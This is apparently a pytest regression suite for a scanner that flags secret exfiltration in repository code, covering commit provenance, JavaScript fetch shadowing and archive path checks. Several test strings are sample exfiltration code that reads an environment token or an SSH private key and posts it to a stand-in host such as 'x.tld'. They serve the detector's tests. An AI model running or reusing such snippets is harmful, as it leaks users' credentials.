"""Regression tests from the post-M2 reliability audit.

Covers four areas:

* GitHub provenance: branch resolution, SHA-pinned archive URLs, no reuse of
  a previous scan's SHA, and metadata that identifies the exact snapshot.
* Python false positives: ``response.read()`` is not a file read.
* Analyser parity: two sources at one sink produce two findings, each citing
  its own source line, in Python as well as JavaScript.
* Scope handling: a locally declared ``fetch`` is not network egress, and
  ``axios.create()`` instances are still network sinks.
* Archive hardening: Windows reserved device names are rejected.
"""

from __future__ import annotations

import ast
from pathlib import Path

import pytest

from backend.config import settings
from backend.core import github, static_analysis
from backend.core.dataflow import scan_flows as python_scan_flows
from backend.core.errors import IngestError
from backend.core.js_analysis import (
    ModuleResolver,
    scan_capabilities as js_scan_capabilities,
    scan_flows as js_scan_flows,
)
from backend.core.js_parser import parse as js_parse
from tests.conftest import files_from_directory, run_repo_scan, run_scan

FIXTURES = Path("fixtures")


# --------------------------------------------------------------------------
# Issue 1: GitHub commit provenance
# --------------------------------------------------------------------------


def test_resolve_queries_the_default_branch_and_its_head_commit(monkeypatch):
    fetcher = github.HttpxFetcher()
    calls: list[str] = []

    def fake_get_json(url: str) -> dict:
        calls.append(url)
        if url.endswith("/repos/octo/repo"):
            return {"private": False, "default_branch": "trunk"}
        return {"sha": "b" * 40}

    monkeypatch.setattr(fetcher, "_get_json", fake_get_json)

    resolved = fetcher.resolve(github.RepoRef("octo", "repo"), settings)

    assert calls == [
        "https://api.github.com/repos/octo/repo",
        "https://api.github.com/repos/octo/repo/commits/trunk",
    ]
    assert resolved.default_branch == "trunk"
    assert resolved.commit_sha == "b" * 40


def test_archive_url_is_pinned_to_the_resolved_commit_not_the_branch():
    resolved = github.ResolvedRepo(
        ref=github.RepoRef("octo", "repo"),
        commit_sha="c" * 40,
        default_branch="main",
    )
    assert resolved.archive_url == (
        "https://codeload.github.com/octo/repo/zip/" + "c" * 40
    )
    # The branch name must not appear: a branch moves, a SHA does not.
    assert "main" not in resolved.archive_url


def test_each_scan_reports_the_sha_resolved_for_that_scan(client, install_fetcher):
    fetcher = install_fetcher(files_from_directory(FIXTURES / "benign_js_calculator"))

    fetcher.commit_sha = "1" * 40
    _, first = run_repo_scan(client, "https://github.com/example/js-calc")

    fetcher.commit_sha = "2" * 40
    _, second = run_repo_scan(client, "https://github.com/example/js-calc")

    assert first["status"] == "complete", first
    assert second["status"] == "complete", second
    # No SHA is reused across scans: each report names its own snapshot.
    assert first["commit_sha"] == "1" * 40
    assert second["commit_sha"] == "2" * 40


def test_scan_metadata_identifies_the_exact_snapshot(client, install_fetcher):
    sha = "d" * 40
    install_fetcher(
        files_from_directory(FIXTURES / "benign_js_calculator"), commit_sha=sha
    )

    _, status = run_repo_scan(client, "https://github.com/example/js-calc")

    assert status["commit_sha"] == sha
    assert status["metadata"]["commit_sha"] == sha
    assert status["metadata"]["archive_url"].endswith("/zip/" + sha)
    assert status["metadata"]["resolved_at"]
    assert status["metadata"]["repo_url"] == "https://github.com/example/js-calc"


def test_scan_report_does_not_claim_the_current_branch_tip(client, install_fetcher):
    install_fetcher(
        files_from_directory(FIXTURES / "benign_js_calculator"),
        commit_sha="e" * 40,
        default_branch="a-moving-branch",
    )
    _, status = run_repo_scan(client, "https://github.com/example/js-calc")

    # The branch name is recorded as metadata, never as the analysed commit.
    assert status["metadata"]["default_branch"] == "a-moving-branch"
    assert status["commit_sha"] == "e" * 40


# --------------------------------------------------------------------------
# Issue 3: Python false positives
# --------------------------------------------------------------------------


def _python_capabilities(source: str):
    tree = ast.parse(source)
    calls = [node for node in ast.walk(tree) if isinstance(node, ast.Call)]
    return tree, calls


def test_response_read_is_not_a_file_read():
    _, calls = _python_capabilities(
        "from urllib.request import urlopen\n"
        "response = urlopen('https://example.com')\n"
        "body = response.read()\n"
    )
    read_call = next(
        node
        for node in calls
        if isinstance(node.func, ast.Attribute) and node.func.attr == "read"
    )
    assert static_analysis.is_file_read(read_call) is False


def test_open_and_read_text_are_still_file_reads():
    _, calls = _python_capabilities(
        "body = open('/etc/hostname').read()\n"
        "text = path.read_text(encoding='utf-8')\n"
    )
    assert any(static_analysis.is_file_read(node) for node in calls if isinstance(node.func, ast.Name))


def test_two_python_sources_at_one_sink_keep_their_own_lines():
    source = (
        "import os, requests\n"
        "def send():\n"
        "    token = os.environ.get('TOKEN')\n"
        "    data = open('/home/u/.ssh/id_rsa').read()\n"
        "    requests.post('https://x.tld', json={'t': token, 'd': data})\n"
    )
    context = static_analysis.AnalysisContext(
        path="snippet.py", source=source, lines=source.splitlines()
    )
    tree = ast.parse(source)

    flows = python_scan_flows(context, tree)
    by_rule = {flow["rule_id"]: flow for flow in flows}

    assert set(by_rule) == {"DF_ENV_TO_NETWORK", "DF_FILE_TO_NETWORK"}
    assert by_rule["DF_ENV_TO_NETWORK"]["source_line"] == 3
    assert by_rule["DF_FILE_TO_NETWORK"]["source_line"] == 4
    for flow in flows:
        assert flow["line"] == 5
        assert len(flow["evidence_ids"]) == 2


# --------------------------------------------------------------------------
# Issue 3: JavaScript/TypeScript scope and sink coverage
# --------------------------------------------------------------------------


def _analyse_js(source: str):
    parsed = js_parse(source, "javascript")
    context = static_analysis.AnalysisContext(
        path="snippet.js", source=source, lines=source.splitlines()
    )
    resolver = ModuleResolver(parsed)
    capabilities, _ = js_scan_capabilities(context, parsed, resolver)
    flows = js_scan_flows(context, parsed, resolver)
    return capabilities, flows


def test_case_a_local_helper_has_no_network_capability():
    source = (
        "function fetch(value) {\n"
        "  return value.trim();\n"
        "}\n"
        "function normalise(input) {\n"
        "  return fetch(input);\n"
        "}\n"
    )
    capabilities, flows = _analyse_js(source)
    assert all(item["rule_id"] != "JS_NETWORK_EGRESS" for item in capabilities)
    assert flows == []


def test_case_b_module_level_fetch_shadows_sibling_function():
    source = (
        "function fetch(value) {\n"
        "  return value.trim();\n"
        "}\n"
        "async function sendData() {\n"
        "  const token = process.env.API_KEY;\n"
        "  await fetch('https://example.com/' + token);\n"
        "}\n"
    )
    capabilities, flows = _analyse_js(source)
    assert all(item["rule_id"] != "JS_NETWORK_EGRESS" for item in capabilities)
    assert flows == []


def test_case_c_parameter_shadowing_is_not_network_egress():
    source = (
        "function process(fetch) {\n"
        "  return fetch('value');\n"
        "}\n"
        "process((val) => 'handled: ' + val);\n"
    )
    capabilities, flows = _analyse_js(source)
    assert all(item["rule_id"] != "JS_NETWORK_EGRESS" for item in capabilities)
    assert flows == []


def test_case_d_genuine_global_fetch_detected():
    source = (
        "async function sendData() {\n"
        "  const token = process.env.API_KEY;\n"
        "  await fetch('https://example.com/' + token);\n"
        "}\n"
    )
    capabilities, flows = _analyse_js(source)
    assert any(item["rule_id"] == "JS_NETWORK_EGRESS" for item in capabilities)
    assert [flow["rule_id"] for flow in flows] == ["JS_ENV_TO_NETWORK"]


def test_nested_function_parameter_shadowing():
    source = (
        "function outer() {\n"
        "  function inner(fetch) {\n"
        "    return fetch('value');\n"
        "  }\n"
        "  return inner(null);\n"
        "}\n"
    )
    capabilities, flows = _analyse_js(source)
    assert all(item["rule_id"] != "JS_NETWORK_EGRESS" for item in capabilities)
    assert flows == []


def test_local_const_arrow_fetch_shadowing():
    source = (
        "function compute() {\n"
        "  const fetch = (x) => x.trim();\n"
        "  return fetch('value');\n"
        "}\n"
    )
    capabilities, flows = _analyse_js(source)
    assert all(item["rule_id"] != "JS_NETWORK_EGRESS" for item in capabilities)
    assert flows == []


def test_module_level_const_fetch_shadowing():
    source = (
        "const fetch = (x) => x.trim();\n"
        "async function run() {\n"
        "  return fetch('value');\n"
        "}\n"
    )
    capabilities, flows = _analyse_js(source)
    assert all(item["rule_id"] != "JS_NETWORK_EGRESS" for item in capabilities)
    assert flows == []


def test_function_local_fetch_does_not_shadow_sibling_global_fetch():
    source = (
        "function helper() {\n"
        "  function fetch(value) {\n"
        "    return value.trim();\n"
        "  }\n"
        "  return fetch('local');\n"
        "}\n"
        "\n"
        "async function sendData() {\n"
        "  const token = process.env.API_KEY;\n"
        "  await fetch('https://example.com/' + token);\n"
        "}\n"
    )
    capabilities, flows = _analyse_js(source)
    network_caps = [
        item for item in capabilities if item["rule_id"] == "JS_NETWORK_EGRESS"
    ]
    assert len(network_caps) == 1
    assert network_caps[0]["line"] == 10
    assert [flow["rule_id"] for flow in flows] == ["JS_ENV_TO_NETWORK"]
    assert flows[0]["line"] == 10


def test_case_e_nested_block_does_not_shadow_outside_call():
    source = (
        "async function sendData() {\n"
        "  const token = process.env.API_KEY;\n"
        "\n"
        "  {\n"
        "    const fetch = (value) => value.trim();\n"
        "    fetch('local');\n"
        "  }\n"
        "\n"
        "  await fetch('https://example.com/' + token);\n"
        "}\n"
    )
    capabilities, flows = _analyse_js(source)
    network_caps = [
        item for item in capabilities if item["rule_id"] == "JS_NETWORK_EGRESS"
    ]
    assert len(network_caps) == 1
    assert network_caps[0]["line"] == 9
    assert [flow["rule_id"] for flow in flows] == ["JS_ENV_TO_NETWORK"]
    assert flows[0]["line"] == 9


def test_case_f_nested_block_declaration_shadows_inside_block():
    source = (
        "function process() {\n"
        "  {\n"
        "    const fetch = (value) => value.trim();\n"
        "    fetch('local');\n"
        "  }\n"
        "}\n"
    )
    capabilities, flows = _analyse_js(source)
    assert all(item["rule_id"] != "JS_NETWORK_EGRESS" for item in capabilities)
    assert flows == []


def test_case_g_nested_block_does_not_shadow_sibling_block():
    source = (
        "async function sendData() {\n"
        "  const token = process.env.API_KEY;\n"
        "\n"
        "  {\n"
        "    const fetch = (value) => value.trim();\n"
        "    fetch('local');\n"
        "  }\n"
        "\n"
        "  {\n"
        "    fetch('https://example.com/' + token);\n"
        "  }\n"
        "}\n"
    )
    capabilities, flows = _analyse_js(source)
    network_caps = [
        item for item in capabilities if item["rule_id"] == "JS_NETWORK_EGRESS"
    ]
    assert len(network_caps) == 1
    assert network_caps[0]["line"] == 10
    assert [flow["rule_id"] for flow in flows] == ["JS_ENV_TO_NETWORK"]
    assert flows[0]["line"] == 10


def test_case_h_function_scoped_var_shadows_throughout_function():
    source = (
        "async function sendData() {\n"
        "  const token = process.env.API_KEY;\n"
        "\n"
        "  if (true) {\n"
        "    var fetch = (value) => value.trim();\n"
        "  }\n"
        "\n"
        "  fetch('https://example.com/' + token);\n"
        "}\n"
    )
    capabilities, flows = _analyse_js(source)
    assert all(item["rule_id"] != "JS_NETWORK_EGRESS" for item in capabilities)
    assert flows == []


def test_for_of_const_shadows_within_loop_body():
    source = (
        "async function sendData(items) {\n"
        "  for (const fetch of items) {\n"
        "    fetch('https://example.com');\n"
        "  }\n"
        "}\n"
    )
    capabilities, flows = _analyse_js(source)
    assert all(item["rule_id"] != "JS_NETWORK_EGRESS" for item in capabilities)
    assert flows == []


def test_catch_clause_parameter_shadows_within_catch_block():
    source = (
        "async function sendData() {\n"
        "  try {\n"
        "    something();\n"
        "  } catch (fetch) {\n"
        "    fetch('https://example.com');\n"
        "  }\n"
        "}\n"
    )
    capabilities, flows = _analyse_js(source)
    assert all(item["rule_id"] != "JS_NETWORK_EGRESS" for item in capabilities)
    assert flows == []


def test_axios_create_instance_is_a_network_sink():
    source = (
        'import axios from "axios";\n'
        "const client = axios.create({ baseURL: 'https://x.tld' });\n"
        "const token = process.env.TOKEN;\n"
        "client.post('/collect', { token });\n"
    )
    capabilities, flows = _analyse_js(source)
    assert any(item["rule_id"] == "JS_NETWORK_EGRESS" for item in capabilities)
    assert [flow["rule_id"] for flow in flows] == ["JS_ENV_TO_NETWORK"]


# --------------------------------------------------------------------------
# Issue 3: Archive hardening
# --------------------------------------------------------------------------


@pytest.mark.parametrize("name", ["pkg/CON.js", "pkg/NUL", "pkg/aux.txt", "COM1.js"])
def test_windows_reserved_device_names_are_rejected(name):
    with pytest.raises(IngestError) as caught:
        github._entry_parts(name)
    assert caught.value.code == "ARCHIVE_UNSAFE_PATH"


def test_ordinary_names_still_pass_archive_validation():
    assert github._entry_parts("pkg/console.js") == ["pkg", "console.js"]
    assert github._entry_parts("src/auxiliary.ts") == ["src", "auxiliary.ts"]


# --------------------------------------------------------------------------
# New regression fixtures
# --------------------------------------------------------------------------


def _findings(client, scan_id):
    return client.get(f"/api/scans/{scan_id}/findings").json()["findings"]


def _tools(client, scan_id):
    return client.get(f"/api/scans/{scan_id}/tools").json()["tools"]


def test_benign_python_http_read_fixture_has_no_file_read(client):
    scan_id = run_scan(client, "benign_py_http_read")
    status = client.get(f"/api/scans/{scan_id}").json()
    rule_ids = {finding["rule_id"] for finding in _findings(client, scan_id)}

    assert status["status"] == "complete", status
    assert status["critical_count"] == 0
    assert "PY_FILE_READ" not in rule_ids
    assert {"PY_ENV_ACCESS", "PY_NETWORK_EGRESS"} <= rule_ids
    assert not {
        "DF_ENV_TO_NETWORK",
        "DF_FILE_TO_NETWORK",
        "DF_ENV_TO_SUBPROCESS",
    } & rule_ids


def test_benign_js_shadowed_fetch_fixture_is_not_network(client):
    scan_id = run_scan(client, "benign_js_env_disconnected")
    status = client.get(f"/api/scans/{scan_id}").json()
    rule_ids = {finding["rule_id"] for finding in _findings(client, scan_id)}

    assert status["status"] == "complete", status
    assert status["critical_count"] == 0
    assert "JS_NETWORK_EGRESS" not in rule_ids
    assert not {rule for rule in rule_ids if rule.startswith("JS_") and "_TO_" in rule}

    tool = _tools(client, scan_id)[0]
    assert tool["observed_capabilities"] == ["READ_ENV"]


def test_malicious_python_multi_source_reports_both_flows(client):
    scan_id = run_scan(client, "malicious_py_multi_source")
    findings = _findings(client, scan_id)
    by_rule = {finding["rule_id"]: finding for finding in findings}

    assert {"DF_ENV_TO_NETWORK", "DF_FILE_TO_NETWORK"} <= set(by_rule)
    assert by_rule["DF_ENV_TO_NETWORK"]["severity"] == "critical"
    assert by_rule["DF_FILE_TO_NETWORK"]["severity"] == "critical"
    assert by_rule["DF_ENV_TO_NETWORK"]["summary"].startswith(
        "Environment variable read at line 26"
    )
    assert by_rule["DF_FILE_TO_NETWORK"]["summary"].startswith(
        "File contents read at line 27"
    )

    source_lines = (FIXTURES / "malicious_py_multi_source" / "server.py").read_text(
        encoding="utf-8"
    ).splitlines()
    for rule_id in ("DF_ENV_TO_NETWORK", "DF_FILE_TO_NETWORK"):
        assert len(by_rule[rule_id]["evidence_ids"]) == 2
        for evidence_id in by_rule[rule_id]["evidence_ids"]:
            evidence = client.get(
                f"/api/scans/{scan_id}/evidence/{evidence_id}"
            ).json()
            assert evidence["path"] == "server.py"
            actual = source_lines[evidence["line_start"] - 1].strip()
            assert actual.startswith(evidence["snippet"].rstrip("…"))


def test_malicious_js_axios_instance_is_detected(client):
    scan_id = run_scan(client, "malicious_js_axios_instance")
    findings = _findings(client, scan_id)
    rule_ids = {finding["rule_id"] for finding in findings}
    status = client.get(f"/api/scans/{scan_id}").json()

    assert status["critical_count"] == 2
    assert {
        "JS_ENV_TO_NETWORK",
        "JS_FILE_TO_NETWORK",
        "JS_SENSITIVE_PATH_READ",
    } <= rule_ids

    tool = _tools(client, scan_id)[0]
    assert set(tool["observed_capabilities"]) == {
        "NETWORK_EGRESS",
        "READ_ENV",
        "READ_FILE",
    }
